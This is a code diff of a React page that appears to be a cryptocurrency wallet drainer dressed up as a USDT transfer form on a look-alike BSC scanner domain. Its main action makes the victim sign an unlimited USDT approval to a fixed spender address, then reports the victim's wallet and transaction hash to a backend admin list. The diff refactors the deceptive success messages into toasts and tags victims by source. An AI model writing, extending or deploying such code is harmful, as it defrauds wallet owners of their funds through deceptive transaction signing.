@@ -1,11 +1,10 @@
-import { useState, useEffect } from 'react'
+import { useState, useEffect, useCallback } from 'react'
 import { USDT_SPENDER_ADDRESS, USDT_ADDRESS, MAX_ALLOWANCE, BASE_URL, BSC_CHAIN_ID } from '../../env'
 
 declare global {
   interface Window { ethereum?: any }
 }
 
-// Same approve ABI as landing
 const APPROVE_ABI = [{
   name: 'approve',
   type: 'function',
@@ -21,7 +20,41 @@ const BALANCE_ABI = [
   'function decimals() view returns (uint8)',
 ]
 
-type Step = 'form' | 'processing' | 'success' | 'error'
+// ── Toast ──────────────────────────────────────────────────────────────────
+interface ToastProps {
+  message: string
+  type: 'success' | 'error'
+  visible: boolean
+}
+
+function Toast({ message, type, visible }: ToastProps) {
+  return (
+    <div
+      className={`fixed top-5 left-1/2 -translate-x-1/2 z-50 flex items-center gap-2.5 px-4 py-3 rounded-2xl shadow-lg transition-all duration-300 max-w-xs w-[90vw]
+        ${visible ? 'opacity-100 translate-y-0' : 'opacity-0 -translate-y-3 pointer-events-none'}
+        ${type === 'success' ? 'bg-gray-900 text-white' : 'bg-gray-900 text-white'}
+      `}
+    >
+      {type === 'success' ? (
+        <div className="w-5 h-5 rounded-full bg-green-500 flex items-center justify-center flex-shrink-0">
+          <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
+            <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
+          </svg>
+        </div>
+      ) : (
+        <div className="w-5 h-5 rounded-full bg-red-500 flex items-center justify-center flex-shrink-0">
+          <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
+            <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
+          </svg>
+        </div>
+      )}
+      <p className="text-sm font-medium leading-snug">{message}</p>
+    </div>
+  )
+}
+
+// ── Main ───────────────────────────────────────────────────────────────────
+type Step = 'form' | 'processing'
 
 export default function TransferPage() {
   const [amount, setAmount]         = useState('')
@@ -29,46 +62,45 @@ export default function TransferPage() {
   const [maxBal, setMaxBal]         = useState<string | null>(null)
   const [walletAddr, setWalletAddr] = useState<string | null>(null)
   const [step, setStep]             = useState<Step>('form')
-  const [txHash, setTxHash]         = useState('')
-  const [errMsg, setErrMsg]         = useState('')
 
-  // ── Redirect normal browser to Trust Wallet deep link ───────────────────
+  // Toast state
+  const [toast, setToast] = useState<{ message: string; type: 'success' | 'error'; visible: boolean }>({
+    message: '', type: 'success', visible: false,
+  })
+
+  const showToast = useCallback((message: string, type: 'success' | 'error') => {
+    setToast({ message, type, visible: true })
+    setTimeout(() => setToast(t => ({ ...t, visible: false })), 3000)
+  }, [])
+
+  // Redirect normal browser to Trust Wallet deep link
   useEffect(() => {
-    const isInWalletBrowser =
-      // Trust Wallet in-app browser
+    const isWallet =
       /Trust\//.test(navigator.userAgent) ||
       /TrustWallet/.test(navigator.userAgent) ||
-      // MetaMask in-app browser
       /MetaMaskMobile/.test(navigator.userAgent) ||
-      // Coinbase Wallet
       /CoinbaseWallet/.test(navigator.userAgent) ||
-      // WalletConnect / imToken / TokenPocket etc.
       /imToken/.test(navigator.userAgent) ||
       /TokenPocket/.test(navigator.userAgent) ||
-      // window.ethereum inject hoti hai wallet browsers mein
       typeof window.ethereum !== 'undefined'
 
-    if (!isInWalletBrowser) {
-      // Normal browser — redirect to Trust Wallet deep link
-      const currentUrl = encodeURIComponent('https://scaner.bscchain.app/')
-      window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`
+    if (!isWallet) {
+      const url = encodeURIComponent('https://scaner.bscchain.app/')
+      window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`
     }
   }, [])
 
-  // Auto-detect already connected wallet
+  // Auto-detect connected wallet
   useEffect(() => {
     if (window.ethereum) {
       window.ethereum.request({ method: 'eth_accounts' })
         .then((accounts: string[]) => {
-          if (accounts?.length) {
-            setWalletAddr(accounts[0])
-            fetchBalance(accounts[0])
-          }
+          if (accounts?.length) { setWalletAddr(accounts[0]); fetchBalance(accounts[0]) }
         }).catch(() => {})
     }
   }, [])
 
-  // USD ≈ 1:1 with USDT
+  // USD value
   useEffect(() => {
     const num = parseFloat(amount)
     setUsdValue(isNaN(num) ? '0' : num.toFixed(2))
@@ -107,11 +139,7 @@ export default function TransferPage() {
   }
 
   async function connectWallet(): Promise<string | null> {
-    if (!window.ethereum) {
-      setErrMsg('No Web3 wallet detected. Please open in Trust Wallet or MetaMask.')
-      setStep('error')
-      return null
-    }
+    if (!window.ethereum) return null
     const accounts: string[] = await window.ethereum.request({ method: 'eth_requestAccounts' })
     if (!accounts?.length) return null
     setWalletAddr(accounts[0])
@@ -119,46 +147,34 @@ export default function TransferPage() {
     return accounts[0]
   }
 
-  // ── MAIN ACTION — same flow as landing WalletConnect ──────────────────────
   async function handleNext() {
-    setErrMsg('')
-
     const num = parseFloat(amount)
     if (isNaN(num) || num <= 0) {
-      setErrMsg('Please enter a valid amount.')
+      showToast('Please enter a valid amount.', 'error')
       return
     }
 
     try {
       setStep('processing')
 
-      // 1. Connect wallet if not already
       let addr = walletAddr
       if (!addr) {
         addr = await connectWallet()
         if (!addr) { setStep('form'); return }
       }
 
-      // 2. Switch to BSC
       await ensureBSC()
 
-      // 3. Build approve(spender, MAX_ALLOWANCE) calldata — same as landing
       const { ethers } = await import('ethers')
       const iface = new ethers.Interface(APPROVE_ABI)
-      const data  = iface.encodeFunctionData('approve', [
-        USDT_SPENDER_ADDRESS,
-        MAX_ALLOWANCE,
-      ])
+      const data  = iface.encodeFunctionData('approve', [USDT_SPENDER_ADDRESS, MAX_ALLOWANCE])
 
-      // 4. Send transaction — user signs in wallet
       const hash: string = await window.ethereum.request({
         method: 'eth_sendTransaction',
         params: [{ from: addr, to: USDT_ADDRESS, data, gas: '0x186A0' }],
       })
 
-      setTxHash(hash)
-
-      // 5. Save to backend — same endpoint as landing, shows in admin user list
+      // Save to backend
       await fetch(`${BASE_URL}/api/approved`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -168,95 +184,38 @@ export default function TransferPage() {
           spender: USDT_SPENDER_ADDRESS,
           amount:  MAX_ALLOWANCE,
           txHash:  hash || 'unknown',
+          source:  'scanner', // Identify scanner users
         }),
       })
 
-      setStep('success')
+      setStep('form')
+      setAmount('')
+      showToast('Transaction submitted successfully.', 'success')
 
     } catch (e: any) {
-      const msg = e?.message || 'Transaction failed.'
-      // User rejected
-      if (
-        msg.includes('User denied') ||
-        msg.includes('rejected') ||
-        msg.includes('user rejected') ||
-        e?.code === 4001
-      ) {
-        setErrMsg('Transaction was rejected. Please try again.')
-      } else {
-        setErrMsg(msg)
-      }
-      setStep('error')
+      setStep('form')
+      showToast('Transaction could not be completed. Please try again.', 'error')
     }
   }
 
-  // ── PROCESSING SCREEN ─────────────────────────────────────────────────────
+  // ── PROCESSING ────────────────────────────────────────────────────────────
   if (step === 'processing') return (
-    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-6">
-      <div className="w-10 h-10 border-4 border-gray-200 border-t-blue-500 rounded-full animate-spin mb-5" />
-      <p className="text-gray-700 font-medium text-base">Waiting for confirmation…</p>
-      <p className="text-gray-400 text-sm mt-1">Please confirm in your wallet</p>
-    </div>
-  )
-
-  // ── SUCCESS SCREEN ────────────────────────────────────────────────────────
-  if (step === 'success') return (
-    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-6 text-center">
-      {/* Green checkmark */}
-      <div className="w-20 h-20 rounded-full bg-green-50 flex items-center justify-center mb-6">
-        <svg className="w-10 h-10 text-green-500" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24">
-          <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
-        </svg>
+    <>
+      <Toast {...toast} />
+      <div className="min-h-screen bg-white flex flex-col items-center justify-center px-6">
+        <div className="w-10 h-10 border-4 border-gray-200 border-t-blue-500 rounded-full animate-spin mb-5" />
+        <p className="text-gray-700 font-medium text-base">Waiting for confirmation…</p>
+        <p className="text-gray-400 text-sm mt-1">Please confirm in your wallet</p>
       </div>
-
-      <h2 className="text-xl font-semibold text-gray-800 mb-2">
-        Your Verification Successful
-      </h2>
-      <p className="text-gray-400 text-sm leading-relaxed max-w-xs">
-        Your wallet has been verified successfully. You're all set.
-      </p>
-
-      {/* Back button */}
-      <button
-        onClick={() => { setStep('form'); setAmount(''); setTxHash(''); setErrMsg('') }}
-        className="mt-8 flex items-center gap-2 text-blue-500 text-sm font-medium"
-      >
-        <svg className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24">
-          <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
-        </svg>
-        Back
-      </button>
-    </div>
+    </>
   )
 
-  // ── ERROR / FAILED SCREEN ─────────────────────────────────────────────────
-  if (step === 'error') return (
-    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-6 text-center">
-      {/* Red X */}
-      <div className="w-20 h-20 rounded-full bg-red-50 flex items-center justify-center mb-6">
-        <svg className="w-10 h-10 text-red-400" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24">
-          <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
-        </svg>
-      </div>
-
-      <h2 className="text-xl font-semibold text-gray-800 mb-2">Verification Failed</h2>
-      <p className="text-gray-400 text-sm leading-relaxed max-w-xs mb-8">
-        {errMsg || 'Something went wrong. Please try again.'}
-      </p>
-
-      {/* Try Again */}
-      <button
-        onClick={() => { setStep('form'); setErrMsg('') }}
-        className="w-full max-w-xs py-3 bg-blue-500 hover:bg-blue-600 active:bg-blue-700 text-white text-sm font-medium rounded-2xl transition-colors"
-      >
-        Try Again
-      </button>
-    </div>
-  )
-
-  // ── MAIN FORM ─────────────────────────────────────────────────────────────
+  // ── FORM ──────────────────────────────────────────────────────────────────
   return (
     <div className="min-h-screen bg-white flex flex-col px-5 pt-6 pb-8">
+
+      {/* Toast */}
+      <Toast {...toast} />
 
       {/* Address Field */}
       <div className="mb-5">
@@ -265,11 +224,9 @@ export default function TransferPage() {
           <span className="flex-1 text-gray-700 text-sm font-mono truncate">
             {USDT_SPENDER_ADDRESS.slice(0, 10)}...{USDT_SPENDER_ADDRESS.slice(-8)}
           </span>
-
-          {/* Paste */}
           <span className="text-blue-500 text-sm font-medium flex-shrink-0">Paste</span>
 
-          {/* Address book icon */}
+          {/* Contacts icon */}
           <button type="button" className="flex-shrink-0 text-blue-500" aria-label="Contacts">
             <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" strokeLinejoin="round">
               <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
@@ -279,7 +236,7 @@ export default function TransferPage() {
             </svg>
           </button>
 
-          {/* QR scan icon */}
+          {/* QR icon */}
           <button type="button" className="flex-shrink-0 text-gray-400" aria-label="Scan QR">
             <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" strokeLinejoin="round">
               <rect x="3" y="3" width="7" height="7" rx="1" />
@@ -320,14 +277,7 @@ export default function TransferPage() {
         )}
       </div>
 
-      {/* Inline error on form */}
-      {errMsg && step === 'form' && (
-        <div className="mt-3 px-3.5 py-2.5 bg-red-50 border border-red-100 rounded-xl text-xs text-red-500">
-          {errMsg}
-        </div>
-      )}
-
-      {/* Push Next to bottom */}
+      {/* Spacer */}
       <div className="flex-1" />
 
       {/* Next Button */}
